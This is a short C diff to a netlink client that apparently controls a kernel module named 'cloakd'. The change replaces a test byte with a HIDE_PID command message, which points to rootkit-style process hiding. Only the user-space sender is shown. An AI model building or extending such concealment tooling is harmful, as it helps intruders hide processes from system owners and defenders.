@@ -11,6 +11,8 @@
 #include <string.h>
 #include <sys/socket.h>
 
+#include "../cloakd/commands.h"
+
 #define NETLINK_USER    31
 #define PAYLOAD_SIZE    64 // TODO: Make this dynamic 
 
@@ -48,9 +50,8 @@ int main(void)
     nlh->nlmsg_pid = getpid();
     nlh->nlmsg_flags = 0;
 
-    unsigned char payload[1] = {0x01};
-    //strcpy(NLMSG_DATA(nlh), "Hello");
-    memcpy(NLMSG_DATA(nlh), payload, 1);
+    unsigned char payload[5] = {HIDE_PID, 0x00, 0x00, 0x00, 0xff};
+    memcpy(NLMSG_DATA(nlh), payload, 5);
 
     iov.iov_base = (void *)nlh;
     iov.iov_len = nlh->nlmsg_len;
